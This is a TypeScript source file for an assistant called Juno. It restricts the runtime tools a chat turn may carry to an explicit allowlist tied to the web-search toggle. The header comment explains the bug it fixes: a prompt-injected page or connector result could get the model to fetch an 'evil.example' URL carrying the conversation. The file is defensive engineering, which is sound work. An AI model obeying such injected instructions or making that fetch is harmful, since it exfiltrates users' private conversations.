/**
 * Which of Juno's own runtime tools a chat turn may carry.
 *
 * Pure, so the rule can be tested without a request: the failure it guards
 * against was invisible for exactly that reason. `openUnifiedAgentToolset`
 * treats an *absent* allowlist as "every registered tool", and the chat route
 * never passed one — so `browser_agent` rode along on every saved turn, on
 * every model, with no toggle. Its risk class is `read_only`, which the
 * approval broker auto-allows, so a prompt-injected connector result or page
 * could tell the model to fetch `https://evil.example/?d=<conversation>` and
 * nothing but the untrusted-content rule stood in the way.
 *
 * The rule now: a runtime tool is attached only when the user explicitly
 * switched on the feature that needs it. Web browsing rides the existing
 * `webSearch` toggle — the same toggle that already adds the untrusted-content
 * rule to the system prompt, so the envelope the browser tool writes always has
 * a rule that reads it.
 */

/** Registry id of the hosted page-reading tool (`src/lib/agent/browser.ts`). */
export const BROWSER_TOOL_ID = "browser_agent";

/** An explicit empty allowlist: no runtime tool at all. */
export const NO_RUNTIME_TOOLS: readonly string[] = Object.freeze([]);

/**
 * The runtime tools a chat turn may expose, from the request's feature toggles.
 * Always an array — never `undefined` — because `undefined` means "everything"
 * one layer down.
 */
export function chatRuntimeToolAllowlist(toggles: { webSearch: boolean }): string[] {
  return toggles.webSearch ? [BROWSER_TOOL_ID] : [...NO_RUNTIME_TOOLS];
}
